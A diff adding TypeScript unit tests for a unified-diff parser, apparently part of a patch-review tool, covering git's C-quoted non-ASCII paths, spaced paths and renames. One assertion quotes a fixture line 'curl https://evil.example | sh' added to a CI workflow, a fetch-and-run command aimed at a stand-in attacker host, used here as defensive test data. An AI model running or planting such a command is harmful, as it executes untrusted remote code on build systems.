@@ -85,6 +85,67 @@ describe('unified diff parsing', () => {
     expect(addedLinesAll(realGit).split('\n')).toEqual(['++ b/src/x.ts', '++ b/README.md']);
   });
 
+  // Round 6: real `git diff` output (git 2.51.2, default core.quotePath=true) for paths git C-quotes
+  // (non-ASCII bytes as octal escapes) and for a path with a space (git appends a TAB to the
+  // `--- a/` / `+++ b/` lines).
+  const real = (name: string) => readFileSync(new URL(`./fixtures/${name}`, import.meta.url), 'utf8');
+
+  it('parses a C-quoted stanza that comes first (real git diff)', () => {
+    const patch = real('real-git-quoted-path-first.patch');
+    expect(patch).toContain('diff --git "a/.github/workflows/\\303\\251vil.yml"');
+    const files = parseUnifiedDiff(patch);
+    expect(files.map((f) => f.path)).toEqual(['.github/workflows/évil.yml', 'src/x.ts']);
+    // The workflow's lines stay with the workflow, the src edit with src/x.ts.
+    expect(addedLines(files[0]?.diff ?? '')).toContain('curl https://evil.example | sh');
+    expect(addedLines(files[1]?.diff ?? '')).toBe('export const x = 2;');
+  });
+
+  it('parses a C-quoted stanza that comes later without merging it into the previous file', () => {
+    const files = parseUnifiedDiff(real('real-git-quoted-path-later.patch'));
+    expect(files.map((f) => f.path)).toEqual(['src/x.ts', 'test/é.test.ts']);
+    expect(addedLines(files[0]?.diff ?? '')).toBe('export const x = 3;');
+    expect(addedLines(files[1]?.diff ?? '')).toContain('fetch(');
+  });
+
+  it('strips the TAB git appends to --- / +++ for a path with a space', () => {
+    const patch = real('real-git-space-path.patch');
+    expect(patch).toContain('+++ b/src/my tool.ts\t\n');
+    const files = parseUnifiedDiff(patch);
+    expect(files.map((f) => [f.path, f.source])).toEqual([['src/my tool.ts', undefined]]);
+  });
+
+  it('a rename from a C-quoted CI path into src/ emits the decoded source path', () => {
+    const files = parseUnifiedDiff(real('real-git-quoted-rename-to-src.patch'));
+    expect(files.map((f) => [f.path, f.source])).toEqual([
+      ['src/evil.ts', undefined],
+      ['.github/workflows/évil.yml', { kind: 'rename', of: 'src/evil.ts' }],
+    ]);
+  });
+
+  it('a rename from a spaced path to a quoted, spaced path (TAB after the quote)', () => {
+    const patch = real('real-git-space-to-quoted-rename.patch');
+    expect(patch).toContain('+++ "b/src/\\303\\251 tool.ts"\t\n');
+    const files = parseUnifiedDiff(patch);
+    expect(files.map((f) => [f.path, f.source])).toEqual([
+      ['src/é tool.ts', undefined],
+      ['src/my tool.ts', { kind: 'rename', of: 'src/é tool.ts' }],
+    ]);
+    expect(addedLinesAll(patch)).toBe('x');
+  });
+
+  it('decodes every C escape git emits in a quoted path', () => {
+    const diff = [
+      'diff --git "a/src/q\\"\\\\\\t\\n\\303\\251.ts" "b/src/q\\"\\\\\\t\\n\\303\\251.ts"',
+      'index 1111111..2222222 100644',
+      '--- "a/src/q\\"\\\\\\t\\n\\303\\251.ts"',
+      '+++ "b/src/q\\"\\\\\\t\\n\\303\\251.ts"',
+      '@@ -1 +1 @@',
+      '-a',
+      '+b',
+    ].join('\n');
+    expect(parseUnifiedDiff(diff).map((f) => f.path)).toEqual(['src/q"\\\t\né.ts']);
+  });
+
   it('an ordinary modification yields exactly one entry', () => {
     expect(parseUnifiedDiff(HUNK).map((f) => f.path)).toEqual(['src/tools/x.ts']);
   });
